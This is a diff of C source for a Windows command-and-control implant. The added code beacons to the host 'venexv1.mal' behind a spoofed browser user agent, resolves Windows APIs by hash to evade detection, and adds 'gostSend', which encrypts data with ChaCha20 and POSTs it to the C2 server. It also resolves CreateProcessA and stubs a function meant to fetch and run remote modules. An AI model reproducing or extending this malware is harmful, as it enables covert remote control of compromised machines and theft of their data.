@@ -38,30 +38,29 @@ void custom_memcpy(void *dest, const void *src, size_t len) {
 
 #include <windows.h>
 
-void WriteHex(uint64_t value, int bytes, PFUNCTION_TABLE ft) {
-    if (bytes <= 0) bytes = 4;      // default = 4 bytes
-    if (bytes > 8) bytes = 8;       // clamp to 8 bytes (64-bit)
+void* WriteHex(const uint8_t* data, size_t bytes, PFUNCTION_TABLE ft) {
+    if (bytes == 0 || data == NULL)
+        return (void*)data;
 
-    int hexDigits = bytes * 2;      // two hex chars per byte
-    int outLen = 2 + hexDigits;     // "0x" + hex digits (no NUL counted for WriteConsole)
-    char buffer[2 + 16 + 1];        // "0x" + up to 16 hex digits + terminating NUL
+    size_t hexDigits = bytes * 2;
+    size_t outLen = 2 + hexDigits; // "0x" + hex digits
+
+    char* buffer = ft->Ntdll.RtlAllocateHeap(ft->Kernel32.GetProcessHeap(), 0, outLen + 1);
+
+    if (!buffer) return (void*)data;
 
     buffer[0] = '0';
     buffer[1] = 'x';
 
-    // Fill hex digits: most-significant nibble first
-    for (int i = 0; i < hexDigits; ++i) {
-        int shift = (hexDigits - 1 - i) * 4;         // shift to grab nibble i
-        uint8_t nibble = (uint8_t)((value >> shift) & 0xF);
-        buffer[2 + i] = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
+    for (size_t i = 0; i < bytes; ++i) {
+        uint8_t byte = data[i];
+        buffer[2 + i*2]     = "0123456789ABCDEF"[byte >> 4];
+        buffer[2 + i*2 + 1] = "0123456789ABCDEF"[byte & 0xF];
     }
 
-    buffer[2 + hexDigits] = '\0';  // null-terminate for safety (not required by WriteConsole)
+    buffer[outLen] = '\0';
 
-    HANDLE hConsole = ft->Kernel32.GetStdHandle(STD_OUTPUT_HANDLE);
-    DWORD written;
-    ft->Kernel32.WriteConsoleA(hConsole, buffer, (DWORD)outLen, &written, NULL);
-    ft->Kernel32.WriteConsoleA(hConsole, "\r\n", 2, &written, NULL);
+    return buffer;
 }
 
 
@@ -240,7 +239,7 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
 
 void c2BeaconCommunicate(PFUNCTION_TABLE ft){
     HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"127.0.0.1", 5000, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 5000, 0);
     HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?id=unequeID", NULL, NULL, NULL, 0);
     ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
@@ -288,6 +287,48 @@ void c2BeaconCommunicate(PFUNCTION_TABLE ft){
     return;
 }
 
+// WinGost API List
+
+// Gost Send function: encrypts message and sends to C2 server
+void gostSend(char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft){
+    if (!apiID) apiID = L"0";  // set default manually
+
+    // Encrypt message using ChaCha20
+    chacha20_Full(message, message, message_len);
+
+    // Send encrypted message to C2 server Using WinHTTP POST request
+    HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 5000, 0);
+    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"POST", apiID, NULL, NULL, NULL, 0);
+    ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, message, message_len, message_len, 0);
+    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
+
+    ft->WinHttp.WinHttpCloseHandle(hRequest);
+    ft->WinHttp.WinHttpCloseHandle(hConnect);
+    ft->WinHttp.WinHttpCloseHandle(hSession);
+
+    return;
+
+}
+
+// gost Print function: prints message to C2 console, with optional formatting
+void gostPrint(char* message, BOOL format, int message_len, PFUNCTION_TABLE ft) {
+    if(!format){
+        gostSend(message, message_len, L"0", ft);
+        return;
+    }
+
+    char* buffer = WriteHex((const uint8_t*)message, message_len, ft);
+    gostSend(buffer, message_len * 2 + 2, L"0", ft);
+
+    ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, buffer);
+
+}
+
+// gost Execute function: fetches and executes module from C2 server
+void gostExecute(const char* command, PFUNCTION_TABLE ft){
+    return;
+}
 
 void __main(void) {
     // Initialize function table
@@ -308,6 +349,7 @@ void __main(void) {
     functionTable.Kernel32.VirtualFree = getFunctionBase(0x81C26E14, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualFree"
     functionTable.Kernel32.GetProcessHeap = getFunctionBase(0x7460A5C2, kernel32Base); // hash of "KERNEL32.DLL" + "ProcessHeap"
     functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
+    functionTable.Kernel32.CreateProcessA = getFunctionBase(0x98975766, kernel32Base); // hash of "KERNEL32.DLL" + "CreateProcessA"
     // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
     // functionTable.Kernel32.HeapFree = getFunctionBase(0xD2A541DC, kernel32Base); // hash of "KERNEL32.DLL" + "HeapFree"
 
@@ -326,6 +368,11 @@ void __main(void) {
     functionTable.WinHttp.WinHttpQueryDataAvailable = getFunctionBase(0x86637F65, winhttpBase); // hash of "winhttp.dll" + "WinHttpQueryDataAvailable"
     functionTable.WinHttp.WinHttpReadData = getFunctionBase(0xCE8D83B0, winhttpBase); // hash of "winhttp.dll" + "WinHttpReadData"
     functionTable.WinHttp.WinHttpCloseHandle = getFunctionBase(0x5C2C973B, winhttpBase); // hash of "winhttp.dll" + "WinHttpCloseHandle"
+
+    // setup WINGOST functions
+    functionTable.WinGost.gostSend = gostSend; // assign gostSend function
+    functionTable.WinGost.gostPrint = gostPrint; // assign gostPrint function
+    functionTable.WinGost.gostExecute = gostExecute; // assign gostExecute function
 
     // Test the resolved functions
     PFUNCTION_TABLE ft = &functionTable;
